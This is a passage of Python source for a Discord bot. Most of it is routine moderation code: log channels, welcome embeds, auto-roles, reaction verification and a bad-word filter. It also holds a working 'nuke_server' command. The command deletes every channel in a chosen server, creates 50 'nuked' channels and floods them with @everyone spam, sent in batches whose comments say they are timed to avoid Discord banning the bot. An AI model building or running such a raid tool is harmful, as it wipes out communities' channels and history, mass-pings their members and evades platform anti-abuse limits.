#Bot – Complete Final Version (All Listed Commands & Features + Auto Role on Join + Userinfo + Ping Commands + Verification + Channel Mod)
# Run: python bot.py
import os
import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
import json
import random
import asyncio
from collections import defaultdict, deque
from datetime import datetime, timedelta
import re
from typing import Optional
def parse_timespan(timespan: str):
    pattern = re.compile(r"(\d+)([dhms])")
    matches = pattern.findall(timespan.lower())
    if not matches: return None
    time_params = {"days": 0, "hours": 0, "minutes": 0, "seconds": 0,"weeks": 0}
    unit_map = {'d': 'days', 'h': 'hours', 'm': 'minutes', 's': 'seconds', 'w': 'weeks'}
    for amount, unit in matches:
        time_params[unit_map[unit]] += int(amount)
    return timedelta(**time_params)

load_dotenv()
TOKEN = os.getenv("TOKEN")
GUILD_ID = os.getenv("GUILD_ID") # e.g. 1476039725319061648
DATA_FILE = "bot_data.json"

# Nuke command configuration
NUKE_KEY = "slimeout8048"  # Change this to your secret confirmation key
CHANNEL_BASE_NAME = "nuked"
SPAM_MSG = "@everyone @here nuked lol"
CHANNEL_COUNT = 50
SPAM_COUNT = 300

if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump({}, f)

def load_data():
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_data(data):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"Save error: {e}")

bot_data = load_data()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.reactions = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents
)

tree = bot.tree  # THIS LINE FIXES THE NameError

# ────────────────────────────────────────────────
# Nuke Autocomplete (unchanged - keep it)
# ────────────────────────────────────────────────
async def admin_server_autocomplete(
    interaction: discord.Interaction,
    current: str
) -> list[app_commands.Choice[str]]:
    choices = []
    for guild in bot.guilds:
        member = guild.get_member(interaction.user.id)
        if member and member.guild_permissions.administrator:
            display = f"{guild.name} ({guild.id})"
            if current.lower() in display.lower() or not current:
                choices.append(app_commands.Choice(name=display, value=str(guild.id)))
            if len(choices) >= 25:
                break
    return choices


# ────────────────────────────────────────────────
# Improved & Working Nuke Command
# ────────────────────────────────────────────────
@tree.command(
    name="nuke_server",
    description="DANGER - Nuke any server you're admin in (key required)"
)
@app_commands.default_permissions(administrator=True)
@app_commands.describe(
    server="Server to target (start typing name)",
    key="Secret confirmation key"
)
@app_commands.autocomplete(server=admin_server_autocomplete)
async def nuke_server_cmd(
    interaction: discord.Interaction,
    server: str,
    key: str
):
    if key != NUKE_KEY:
        await interaction.response.send_message("❌ Wrong key.", ephemeral=True)
        return

    try:
        guild_id = int(server)
    except ValueError:
        await interaction.response.send_message("Invalid server ID.", ephemeral=True)
        return

    target_guild = bot.get_guild(guild_id)
    if target_guild is None:
        await interaction.response.send_message("Bot not in that server.", ephemeral=True)
        return

    member = target_guild.get_member(interaction.user.id)
    if not member or not member.guild_permissions.administrator:
        await interaction.response.send_message(
            "You need Administrator permission in that server.", ephemeral=True)
        return

    # Defer immediately – gives 15 minutes to finish
    await interaction.response.defer(ephemeral=False)

    try:
        await interaction.followup.send(
            f"☢️ **NUKE STARTED** on {target_guild.name} ({guild_id})\n"
            "Deleting channels → Creating spam channels → Flooding...",
            ephemeral=False
        )

        # Phase 1: Delete channels (fast parallel)
        deleted = 0
        delete_tasks = [ch.delete(reason=f"nuke by {interaction.user}") for ch in list(target_guild.channels)]
        delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)
        deleted = sum(1 for r in delete_results if not isinstance(r, Exception))
        await interaction.followup.send(f"Deleted **{deleted}** channels", ephemeral=False)

        # Phase 2: Create channels (fast parallel)
        created = []
        create_tasks = []
        for i in range(CHANNEL_COUNT):
            name = CHANNEL_BASE_NAME if i == 0 else f"{CHANNEL_BASE_NAME}-{i+1}"
            create_tasks.append(target_guild.create_text_channel(name))

        create_results = await asyncio.gather(*create_tasks, return_exceptions=True)
        created = [ch for ch in create_results if isinstance(ch, discord.TextChannel)]
        await interaction.followup.send(f"Created **{len(created)}** channels", ephemeral=False)

        # Phase 3: Spam in safe batches
        if created:
            sent = 0
            
            global SPAM_COUNT  # ← THIS FIXES the "cannot access local variable" error
            
            # ─── SAFETY CAP ───
            MAX_SAFE_SPAM = 250  # ← Change this to whatever max you want (e.g. 200, 300, 150)
            if SPAM_COUNT > MAX_SAFE_SPAM:
                await interaction.followup.send(
                    f"⚠️ Safety cap activated: Limiting to **{MAX_SAFE_SPAM}** messages to avoid Discord banning the bot.",
                    ephemeral=False
                )
                SPAM_COUNT = MAX_SAFE_SPAM
            # ──────────────────

            batch_size = 15
            delay_between_batches = 3.0  # seconds – helps avoid instant 429

            for start in range(0, SPAM_COUNT, batch_size):
                batch = []
                for _ in range(min(batch_size, SPAM_COUNT - start)):
                    ch = random.choice(created)
                    batch.append(ch.send(SPAM_MSG))
                    sent += 1

                if batch:
                    await asyncio.gather(*batch, return_exceptions=True)

                # Delay between batches
                if start + batch_size < SPAM_COUNT:
                    await asyncio.sleep(delay_between_batches)

                # Progress update
                try:
                    await interaction.followup.send(
                        f"Spam progress: **{sent}/{SPAM_COUNT}** messages sent",
                        ephemeral=False
                    )
                except:
                    pass  # continue even if update fails

            await interaction.followup.send(f"Spam finished – **{sent}** messages sent", ephemeral=False)

        # Final success message
        await interaction.followup.send(
            f"**Nuke completed** on {target_guild.name}\n"
            f"Deleted: {deleted} | Created: {len(created)} | Spam: {sent}",
            ephemeral=True
        )

    except Exception as e:
        print(f"Nuke error: {str(e)}")
        try:
            await interaction.followup.send(f"Critical error during nuke: {str(e)}", ephemeral=True)
        except:
            print("Final followup failed – nuke may have partially completed")
# ────────────────────────────────────────────────
# Rest of your original code (unchanged from here)
# ────────────────────────────────────────────────

# Anti-spam tracker: guild → user → deque of timestamps
spam_tracker = defaultdict(lambda: defaultdict(deque))
# Active ping tasks: guild_id → user_id → asyncio.Task
ping_tasks = {}
# Recent bans history (in-memory, last 50 per guild)
ban_history = defaultdict(list)
# Recent warns history (in-memory, last 50 per guild)
warn_history_log = defaultdict(list)
# Color name → hex mapping (for easier selection)
COLOR_MAP = {
    "red": "ff0000",
    "green": "00ff00",
    "blue": "0000ff",
    "cyan": "00ffff",
    "magenta": "ff00ff",
    "yellow": "ffff00",
    "orange": "ffa500",
    "purple": "800080",
    "pink": "ffc0cb",
    "lime": "32cd32",
    "teal": "008080",
    "navy": "000080",
    "gold": "ffd700",
    "silver": "c0c0c0",
    "white": "ffffff",
    "black": "000000",
    "grey": "808080",
    "brown": "a52a2a",
}

@bot.event
async def on_ready():
    print("Starting Bot...")
    ping_tasks.clear()
   
    try:
        if GUILD_ID:
            guild = discord.Object(id=int(GUILD_ID))
            tree.copy_global_to(guild=guild)
            synced = await tree.sync(guild=guild)
            print(f"Synced {len(synced)} guild command(s) to {GUILD_ID}")
        else:
            synced = await tree.sync()
            print(f"Synced {len(synced)} global command(s)")
    except Exception as e:
        print(f"Sync failed: {e}")

def get_guild_data(guild_id):
    gid = str(guild_id)
    if gid not in bot_data:
        bot_data[gid] = {
            "welcome_channel": None,
            "welcome_settings": {
                "title": "Welcome!",
                "description": "Welcome {user} to **{server}**!\nWe're now **{member_count}** members strong!\nPlease read #rules and have fun!",
                "color": "0x00ff00",
                "show_join_date": True,
                "show_member_count": True,
            },
            "log_channel": None,
            "timeout_log_channel": None,
            "ban_log_channel": None,
            "warn_log_channel": None,
            "autorole_log_channel": None,
            "delete_log_channel": None,
            "join_role_id": None,
            "badwords": [],
            "ignored_roles": [],
            "ignored_users": [],
            "tags": {},
            "rr": {},
            "starboard_channel": None,
            "starboard_threshold": 5,
            "antispam_enabled": True,
            "antispam_messages": 5,
            "antispam_seconds": 5,
            "warnings": {},
            "verify": {
                "channel_id": None,
                "message_id": None,
                "role_id": None,
                "emoji": "✅",
                "remove_after_verify": False,
                "remove_role_id": None
            }
        }
    return bot_data[gid]

# ────────────────────────────────────────────────
# Moderation Logging Helpers
# ────────────────────────────────────────────────
def log_general_action(guild, action_type, actor, target=None, reason=None, extra=None):
    guild_data = get_guild_data(guild.id)
    log_cid = guild_data.get("log_channel")
    if not log_cid: return
    log_channel = guild.get_channel(log_cid)
    if not log_channel: return
    embed = discord.Embed(title=f"Moderation: {action_type}", color=0xff5555, timestamp=datetime.utcnow())
    embed.add_field(name="By", value=actor.mention if actor else "Unknown", inline=True)
    if target:
        embed.add_field(name="Target", value=target.mention if target else "N/A", inline=True)
    embed.add_field(name="Reason", value=reason or "None", inline=False)
    if extra:
        embed.add_field(name="Details", value=extra, inline=False)
    embed.set_footer(text="General Log • BOT")
    asyncio.create_task(log_channel.send(embed=embed))

def log_timeout_action(guild, actor, target, duration_min=None, reason=None, is_antispam=False, is_unmute=False):
    guild_data = get_guild_data(guild.id)
    timeout_log_cid = guild_data.get("timeout_log_channel")
    log_channel = guild.get_channel(timeout_log_cid) if timeout_log_cid else None
    title = "User Unmuted" if is_unmute else "User Timed Out"
    color = 0x55ff55 if is_unmute else 0xffaa00
    embed = discord.Embed(title=title, color=color, timestamp=datetime.utcnow())
    embed.add_field(name="Target", value=target.mention, inline=True)
    if duration_min is not None and not is_unmute:
        embed.add_field(name="Duration", value=f"{duration_min} minutes", inline=True)
    embed.add_field(name="Reason", value=reason or "No reason", inline=False)
    embed.add_field(name="Triggered by", value="Anti-spam" if is_antispam else actor.mention, inline=False)
    embed.set_footer(text="Timeout Log • BOT")
    if log_channel:
        asyncio.create_task(log_channel.send(embed=embed))
    else:
        log_general_action(guild, "UNMUTE" if is_unmute else "TIMEOUT", actor, target, reason, f"Duration: {duration_min} min" if duration_min else None)

def log_warn_action(guild, actor, target, reason=None):
    guild_data = get_guild_data(guild.id)
    log_cid = guild_data.get("log_channel")
    if not log_cid: return
    log_channel = guild.get_channel(log_cid)
    if not log_channel: return
    embed = discord.Embed(title="User Warned", color=0xffaa00, timestamp=datetime.utcnow())
    embed.add_field(name="Target", value=target.mention, inline=True)
    embed.add_field(name="By", value=actor.mention, inline=True)
    embed.add_field(name="Reason", value=reason or "No reason provided", inline=False)
    embed.set_footer(text="Warning Log • Bot")
    asyncio.create_task(log_channel.send(embed=embed))

# ────────────────────────────────────────────────
# Generic multi-channel log sender (NEW)
# ────────────────────────────────────────────────
async def send_log(guild, log_type, embed):
    guild_data = get_guild_data(guild.id)
   
    channel_map = {
        "general": "log_channel",
        "timeout": "timeout_log_channel",
        "ban": "ban_log_channel",
        "warn": "warn_log_channel",
        "autorole": "autorole_log_channel",
        "delete": "delete_log_channel",
    }
   
    key = channel_map.get(log_type, "log_channel")
    cid = guild_data.get(key) or guild_data.get("log_channel")
   
    if not cid:
        return
   
    channel = guild.get_channel(cid)
    if channel:
        try:
            await channel.send(embed=embed)
        except Exception as e:
            print(f"Log send failed ({log_type}) in channel {cid}: {e}")

# ────────────────────────────────────────────────
# NEW: Dedicated Log Channel Setup Commands
# ────────────────────────────────────────────────
@tree.command(name="set_ban_log", description="Set channel for ban logs")
@app_commands.default_permissions(administrator=True)
async def set_ban_log(interaction: discord.Interaction, channel: discord.TextChannel):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["ban_log_channel"] = channel.id
    save_data(bot_data)
    await interaction.response.send_message(f"Ban logs will now go to {channel.mention}", ephemeral=True)

@tree.command(name="set_warn_log", description="Set channel for warn logs")
@app_commands.default_permissions(administrator=True)
async def set_warn_log(interaction: discord.Interaction, channel: discord.TextChannel):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["warn_log_channel"] = channel.id
    save_data(bot_data)
    await interaction.response.send_message(f"Warn logs will now go to {channel.mention}", ephemeral=True)

@tree.command(name="set_autorole_log", description="Set channel for auto-role logs")
@app_commands.default_permissions(administrator=True)
async def set_autorole_log(interaction: discord.Interaction, channel: discord.TextChannel):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["autorole_log_channel"] = channel.id
    save_data(bot_data)
    await interaction.response.send_message(f"Auto-role logs will now go to {channel.mention}", ephemeral=True)

@tree.command(name="set_delete_log", description="Set channel for deleted message logs")
@app_commands.default_permissions(administrator=True)
async def set_delete_log(interaction: discord.Interaction, channel: discord.TextChannel):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["delete_log_channel"] = channel.id
    save_data(bot_data)
    await interaction.response.send_message(f"Message deletion logs will now go to {channel.mention}", ephemeral=True)

@tree.command(name="log_settings", description="Show current log channel configuration")
@app_commands.default_permissions(administrator=True)
async def log_settings(interaction: discord.Interaction):
    guild_data = get_guild_data(interaction.guild_id)
   
    embed = discord.Embed(title="Log Channel Settings", color=0x5865F2, timestamp=datetime.utcnow())
    embed.add_field(name="General Log", value=f"<#{guild_data.get('log_channel') or 'Not set'}>", inline=False)
    embed.add_field(name="Timeouts/Mutes", value=f"<#{guild_data.get('timeout_log_channel') or 'Not set'}>", inline=False)
    embed.add_field(name="Bans", value=f"<#{guild_data.get('ban_log_channel') or 'Not set'}>", inline=False)
    embed.add_field(name="Warns", value=f"<#{guild_data.get('warn_log_channel') or 'Not set'}>", inline=False)
    embed.add_field(name="Auto-Role", value=f"<#{guild_data.get('autorole_log_channel') or 'Not set'}>", inline=False)
    embed.add_field(name="Message Deletes", value=f"<#{guild_data.get('delete_log_channel') or 'Not set'}>", inline=False)
   
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ────────────────────────────────────────────────
# Auto-Join Role & Welcome Message
# ────────────────────────────────────────────────
@bot.event
async def on_member_join(member):
    guild = member.guild
    guild_data = get_guild_data(guild.id)
   
    role_id = guild_data.get("join_role_id")
    if role_id:
        role = guild.get_role(role_id)
        if role:
            try:
                await member.add_roles(role)
                print(f"Assigned {role.name} to {member}")
                embed = discord.Embed(title="Auto Role Assigned", description=f"{member.mention} received {role.name}", color=0x55ff55, timestamp=datetime.utcnow())
                embed.set_footer(text="Join Role Log • Bot")
                await send_log(guild, "autorole", embed)
            except discord.Forbidden:
                print(f"Missing perms to assign role to {member}")
    cid = guild_data.get("welcome_channel")
    if not cid:
        return
    channel = guild.get_channel(cid)
    if not channel:
        return
    settings = guild_data.get("welcome_settings", {
        "title": "Welcome!",
        "description": "Welcome {user} to **{server}**!\nWe're now **{member_count}** members strong!\nPlease read #rules and have fun!",
        "color": "0x00ff00",
        "show_join_date": True,
        "show_member_count": True,
    })
    try:
        color_int = int(settings["color"], 0)
        title = settings["title"].format(user=member.mention, server=guild.name, member_count=guild.member_count)
        desc = settings["description"].format(user=member.mention, server=guild.name, member_count=guild.member_count)
        embed = discord.Embed(
            title=title,
            description=desc,
            color=color_int,
            timestamp=datetime.utcnow()
        )
        embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
        if settings.get("show_join_date", True) and member.joined_at:
            embed.add_field(name="Joined Server", value=discord.utils.format_dt(member.joined_at, "F"), inline=True)
        if settings.get("show_member_count", True):
            embed.add_field(name="Member Count", value=f"{guild.member_count:,}", inline=True)
        embed.set_footer(text="Welcome to the server! • Bot")
        await channel.send(embed=embed)
    except Exception as e:
        print(f"Welcome message failed in {guild.id}: {e}")

# ────────────────────────────────────────────────
# Test & History Commands (admin only)
# ────────────────────────────────────────────────
@tree.command(name="test_welcome", description="Simulate sending the welcome message to yourself (admin only)")
@app_commands.default_permissions(administrator=True)
async def test_welcome(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        await on_member_join(interaction.user)
        await interaction.followup.send(
            "Simulation complete!\n"
            "→ Welcome embed should appear in the configured welcome channel\n"
            "→ Auto-role log (if enabled) should appear in the log channel\n"
            "Note: join timestamp will still show your actual join time.",
            ephemeral=True
        )
    except Exception as e:
        await interaction.followup.send(f"Simulation error: {str(e)}", ephemeral=True)

@tree.command(name="test_badword", description="Test if a message would be caught/deleted by the badword filter (admin only)")
@app_commands.default_permissions(administrator=True)
async def test_badword(interaction: discord.Interaction, test_message: str):
    guild_data = get_guild_data(interaction.guild_id)
    if str(interaction.user.id) in guild_data.get("ignored_users", []):
        await interaction.response.send_message(
            "You are ignored from the badword filter — message would **NOT** be deleted.",
            ephemeral=True
        )
        return
    user_roles = {str(r.id) for r in interaction.user.roles}
    if user_roles & set(guild_data.get("ignored_roles", [])):
        await interaction.response.send_message(
            "Your role is ignored from the badword filter — message would **NOT** be deleted.",
            ephemeral=True
        )
        return
    test_content = test_message.lower()
    badwords = guild_data.get("badwords", [])
    caught_words = [w for w in badwords if w in test_content]
    if caught_words:
        response = (
            f"**Badword filter triggered!**\n"
            f"Message: `{test_message}`\n"
            f"Caught words: {', '.join(caught_words)}\n\n"
            f"→ Message would be **deleted**\n"
            f"→ Bot would reply: \"{interaction.user.mention}, language!\" (deleted after 6s)"
        )
    else:
        response = (
            f"No badwords detected.\n"
            f"Message: `{test_message}`\n"
            f"Current badword list: {len(badwords)} words\n"
            f"→ Message would **NOT** be deleted"
        )
    await interaction.response.send_message(response, ephemeral=True)

@tree.command(name="recent_bans", description="Show recent bans (admin only)")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(limit="Number of recent bans to show (default 10, max 20)")
async def recent_bans(interaction: discord.Interaction, limit: app_commands.Range[int, 1, 20] = 10):
    guild_id = interaction.guild_id
    entries = ban_history.get(guild_id, [])
   
    if not entries:
        await interaction.response.send_message("No recent bans recorded yet.", ephemeral=True)
        return
   
    embed = discord.Embed(title="Recent Bans", color=0xff0000, timestamp=datetime.utcnow())
    shown = entries[-limit:][::-1] # Newest first
   
    description = ""
    for e in shown:
        ts = datetime.fromisoformat(e["timestamp"]).strftime("%b %d %Y %H:%M UTC")
        description += (
            f"**{ts}**\n"
            f"**Banned:** {e['target']} (ID: {e['target_id']})\n"
            f"**By:** {e['banned_by']} (ID: {e['banned_by_id']})\n"
            f"**Reason:** {e['reason']}\n\n"
        )
   
    embed.description = description or "No entries in range."
    embed.set_footer(text=f"Showing {len(shown)} of {len(entries)} total • Bot")
   
    await interaction.response.send_message(embed=embed, ephemeral=True)

@tree.command(name="recent_warns", description="Show recent warnings issued (admin only)")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(limit="Number of recent warnings to show (default 10, max 20)")
async def recent_warns(interaction: discord.Interaction, limit: app_commands.Range[int, 1, 20] = 10):
    guild_id = interaction.guild_id
    entries = warn_history_log.get(guild_id, [])
   
    if not entries:
        await interaction.response.send_message("No recent warnings recorded yet.", ephemeral=True)
        return
   
    embed = discord.Embed(title="Recent Warnings Issued", color=0xffaa00, timestamp=datetime.utcnow())
    shown = entries[-limit:][::-1] # Newest first
   
    description = ""
    for e in shown:
        ts = datetime.fromisoformat(e["timestamp"]).strftime("%b %d %Y %H:%M UTC")
        description += (
            f"**{ts}**\n"
            f"**Warned:** {e['target']} (ID: {e['target_id']})\n"
            f"**By:** {e['warner']} (ID: {e['warner_id']})\n"
            f"**Reason:** {e['reason']}\n\n"
        )
   
    embed.description = description or "No entries in range."
    embed.set_footer(text=f"Showing {len(shown)} of {len(entries)} total • Bot")
   
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ────────────────────────────────────────────────
# Welcome Customization Commands
# ────────────────────────────────────────────────
@tree.command(name="set_welcome", description="Set welcome channel")
@app_commands.default_permissions(administrator=True)
async def set_welcome(interaction: discord.Interaction, channel: discord.TextChannel):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["welcome_channel"] = channel.id
    save_data(bot_data)
    await interaction.response.send_message(f"Welcome set to {channel.mention}", ephemeral=True)

@tree.command(name="set_welcome_message", description="Customize the welcome message (title, text, color, etc.)")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(
    title="New title (use {user} for mention, {server} for server name, {member_count} for member count)",
    description="Main text (supports {user}, {server}, {member_count})",
    color="Hex color (e.g. 00ff00) or name (red, green, blue, cyan, yellow, orange, purple, pink, gold, white, black, grey, brown)",
    show_join_date="Show when the member joined? (yes/no)",
    show_member_count="Show current member count? (yes/no)"
)
async def set_welcome_message(
    interaction: discord.Interaction,
    title: str = None,
    description: str = None,
    color: str = None,
    show_join_date: str = None,
    show_member_count: str = None
):
    guild_data = get_guild_data(interaction.guild_id)
    settings = guild_data.setdefault("welcome_settings", {
        "title": "Welcome!",
        "description": "Welcome {user} to the server!",
        "color": "0x00ff00",
        "show_join_date": True,
        "show_member_count": True,
    })
    updated = False
    if title is not None:
        settings["title"] = title
        updated = True
    if description is not None:
        settings["description"] = description
        updated = True
    if color is not None:
        color_clean = color.strip().lower().lstrip('#')
        hex_val = None
        if color_clean in COLOR_MAP:
            hex_val = COLOR_MAP[color_clean]
        elif len(color_clean) == 6 and all(c in '0123456789abcdef' for c in color_clean):
            hex_val = color_clean
        if hex_val:
            settings["color"] = f"0x{hex_val}"
            updated = True
            preview_embed = discord.Embed(
                title="Color Preview",
                description="This will be the background color of your welcome messages.",
                color=int(settings["color"], 0)
            )
            preview_embed.set_footer(text=f"Selected: {color} → #{hex_val}")
            await interaction.response.send_message(
                "Welcome settings updated! Color preview below:",
                embed=preview_embed,
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                "Invalid color!\nUse a name like `red`, `blue`, `green`, `yellow`, `purple`, `gold`, `cyan`, `pink`, `orange`, `lime`, `teal`, `navy`, `silver`, `grey`, `brown`...\nor a 6-digit hex code like `00ff00` (no # needed).",
                ephemeral=True
            )
            return
    if show_join_date is not None:
        settings["show_join_date"] = show_join_date.lower() in ("yes", "y", "true", "1", "on")
        updated = True
    if show_member_count is not None:
        settings["show_member_count"] = show_member_count.lower() in ("yes", "y", "true", "1", "on")
        updated = True
    if updated:
        save_data(bot_data)
        await interaction.response.send_message("Welcome message settings updated!", ephemeral=True)
    else:
        await interaction.response.send_message("No changes were made.", ephemeral=True)

# ────────────────────────────────────────────────
# Verification Setup Command
# ────────────────────────────────────────────────
@tree.command(name="setupverify", description="Set up verification: replace non-member role with member role on reaction")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(
    channel="Channel where the verification message goes",
    add_role="Role to GIVE when user verifies (member/verified role)",
    emoji="Reaction emoji (default ✅)",
    remove_role="Role to REMOVE when user verifies (non-member/unverified role - optional)",
    title="Embed title (optional)",
    description="Embed description (optional)",
    remove_reaction="Remove user's reaction after they verify? (yes/no, default: no)"
)
async def setupverify(
    interaction: discord.Interaction,
    channel: discord.TextChannel,
    add_role: discord.Role,
    emoji: str = "✅",
    remove_role: discord.Role = None,
    title: str = "Server Verification",
    description: str = "React with the emoji below to verify and get access to the server!",
    remove_reaction: str = "no"
):
    guild_data = get_guild_data(interaction.guild_id)
    if add_role >= interaction.guild.me.top_role:
        await interaction.response.send_message("I can't assign a role higher than or equal to my top role.", ephemeral=True)
        return
    if remove_role and remove_role >= interaction.guild.me.top_role:
        await interaction.response.send_message("I can't remove a role higher than or equal to my top role.", ephemeral=True)
        return
    remove_reaction_bool = remove_reaction.lower() in ("yes", "y", "true", "1")
    try:
        embed = discord.Embed(
            title=title,
            description=description,
            color=0x55ff55,
            timestamp=datetime.utcnow()
        )
        embed.set_footer(text="React to verify • Bot")
        msg = await channel.send(embed=embed)
        await msg.add_reaction(emoji)
        guild_data["verify"] = {
            "channel_id": channel.id,
            "message_id": msg.id,
            "role_id": add_role.id,
            "emoji": emoji,
            "remove_after_verify": remove_reaction_bool,
            "remove_role_id": remove_role.id if remove_role else None
        }
        save_data(bot_data)
        reply = f"Verification panel created in {channel.mention}!\n"
        reply += f"• Grants: {add_role.mention}\n"
        if remove_role:
            reply += f"• Removes: {remove_role.mention} on verify\n"
        if remove_reaction_bool:
            reply += "• Reactions will be removed automatically after verification"
        await interaction.response.send_message(reply, ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("Missing permission to send message or add reaction.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Error: {str(e)}", ephemeral=True)

# ────────────────────────────────────────────────
# Userinfo Command
# ────────────────────────────────────────────────
@tree.command(name="userinfo", description="View detailed information about a user (or yourself)")
@app_commands.describe(member="The user to get info about (optional, defaults to yourself)")
async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
    target = member if member else interaction.user
    embed = discord.Embed(title=f"User Info: {target}", color=target.top_role.color if target.top_role else 0x5865F2, timestamp=datetime.utcnow())
    embed.set_thumbnail(url=target.avatar.url if target.avatar else target.default_avatar.url)
    embed.add_field(name="Username", value=f"{target.name}#{target.discriminator}", inline=True)
    embed.add_field(name="Display Name", value=target.display_name, inline=True)
    embed.add_field(name="User ID", value=str(target.id), inline=True)
    embed.add_field(name="Joined Server", value=discord.utils.format_dt(target.joined_at, "F") if target.joined_at else "Unknown", inline=True)
    embed.add_field(name="Account Created", value=discord.utils.format_dt(target.created_at, "F"), inline=True)
    roles = [r.mention for r in target.roles if r != interaction.guild.default_role]
    embed.add_field(name=f"Roles ({len(roles)})", value=" ".join(roles) or "None", inline=False)
    embed.add_field(name="Bot", value="Yes" if target.bot else "No", inline=True)
    embed.add_field(name="Boosting Since", value=discord.utils.format_dt(target.premium_since, "F") if target.premium_since else "Not boosting", inline=True)
    embed.set_footer(text="Bot User Info")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ────────────────────────────────────────────────
# Setup & Badword Commands
# ────────────────────────────────────────────────
@tree.command(name="set_log", description="Set general log channel")
@app_commands.default_permissions(administrator=True)
async def set_log(interaction: discord.Interaction, channel: discord.TextChannel):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["log_channel"] = channel.id
    save_data(bot_data)
    await interaction.response.send_message(f"General log set to {channel.mention}", ephemeral=True)

@tree.command(name="set_timeout_log", description="Set dedicated timeout log channel")
@app_commands.default_permissions(administrator=True)
async def set_timeout_log(interaction: discord.Interaction, channel: discord.TextChannel):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["timeout_log_channel"] = channel.id
    save_data(bot_data)
    await interaction.response.send_message(f"Timeout logs → {channel.mention}", ephemeral=True)

@tree.command(name="set_join_role", description="Set the role to give new members on join")
@app_commands.default_permissions(administrator=True)
async def set_join_role(interaction: discord.Interaction, role: discord.Role):
    guild_data = get_guild_data(interaction.guild_id)
    guild_data["join_role_id"] = role.id
    save_data(bot_data)
    await interaction.response.send_message(f"New members will now receive {role.mention} on join.", ephemeral=True)

@tree.command(name="add_badword", description="Add word to filter")
@app_commands.default_permissions(administrator=True)
async def add_badword(interaction: discord.Interaction, word: str):
    guild_data = get_guild_data(interaction.guild_id)
    w = word.lower()
    if w not in guild_data["badwords"]:
        guild_data["badwords"].append(w)
        save_data(bot_data)
        await interaction.response.send_message(f"Added '{word}'", ephemeral=True)
    else:
        await interaction.response.send_message(f"'{word}' already added.", ephemeral=True)

@tree.command(name="remove_badword", description="Remove word from filter")
@app_commands.default_permissions(administrator=True)
async def remove_badword(interaction: discord.Interaction, word: str):
    guild_data = get_guild_data(interaction.guild_id)
    w = word.lower()
    if w in guild_data["badwords"]:
        guild_data["badwords"].remove(w)
        save_data(bot_data)
        await interaction.response.send_message(f"Removed '{word}'", ephemeral=True)
    else:
        await interaction.response.send_message(f"'{word}' not in filter.", ephemeral=True)

@tree.command(name="badwords_list", description="List bad words")
async def badwords_list(interaction: discord.Interaction):
    guild_data = get_guild_data(interaction.guild_id)
    words = guild_data.get("badwords", [])
    if words:
        embed = discord.Embed(title="Bad Words", color=0xff5555)
        embed.description = "\n".join([f"• {w}" for w in words])
        embed.set_footer(text=f"Total: {len(words)}")
        await interaction.response.send_message(embed=embed, ephemeral=True)
    else:
        await interaction.response.send_message("No bad words filtered.", ephemeral=True)

@tree.command(name="badwords_clear", description="Clear all bad words (confirm 'yes')")
@app_commands.default_permissions(administrator=True)
async def badwords_clear(interaction: discord.Interaction):
    guild_data = get_guild_data(interaction.guild_id)
    if not guild_data["badwords"]:
        await interaction.response.send_message("Already empty.", ephemeral=True)
        return
    await interaction.response.send_message("Type 'yes' in chat within 30s to clear ALL.", ephemeral=False)
    def check(m):
        return m.author.id == interaction.user.id and m.channel.id == interaction.channel.id and m.content.lower() == "yes"
    try:
        await bot.wait_for("message", check=check, timeout=30.0)
        guild_data["badwords"] = []
        save_data(bot_data)
        await interaction.followup.send("Cleared all bad words.", ephemeral=True)
    except asyncio.TimeoutError:
        await interaction.followup.send("Timed out – no change.", ephemeral=True)

# ────────────────────────────────────────────────
# Badword Ignore Commands
# ────────────────────────────────────────────────
@tree.command(name="ignore_role_badword", description="Make role ignore badword filter")
@app_commands.default_permissions(administrator=True)
async def ignore_role_badword(interaction: discord.Interaction, role: discord.Role):
    guild_data = get_guild_data(interaction.guild_id)
    rid = str(role.id)
    guild_data.setdefault("ignored_roles", [])
    if rid not in guild_data["ignored_roles"]:
        guild_data["ignored_roles"].append(rid)
        save_data(bot_data)
        await interaction.response.send_message(f"{role.mention} ignored from badword filter", ephemeral=True)

@tree.command(name="ignore_user_badword", description="Make user ignore badword filter")
@app_commands.default_permissions(administrator=True)
async def ignore_user_badword(interaction: discord.Interaction, user: discord.Member):
    guild_data = get_guild_data(interaction.guild_id)
    uid = str(user.id)
    guild_data.setdefault("ignored_users", [])
    if uid not in guild_data["ignored_users"]:
        guild_data["ignored_users"].append(uid)
        save_data(bot_data)
        await interaction.response.send_message(f"{user.mention} ignored from badword filter", ephemeral=True)

@tree.command(name="unignore_role_badword", description="Stop role ignoring badword filter")
@app_commands.default_permissions(administrator=True)
async def unignore_role_badword(interaction: discord.Interaction, role: discord.Role):
    guild_data = get_guild_data(interaction.guild_id)
    rid = str(role.id)
    if "ignored_roles" in guild_data and rid in guild_data["ignored_roles"]:
        guild_data["ignored_roles"].remove(rid)
        save_data(bot_data)
        await interaction.response.send_message(f"{role.mention} no longer ignored", ephemeral=True)

@tree.command(name="unignore_user_badword", description="Stop user ignoring badword filter")
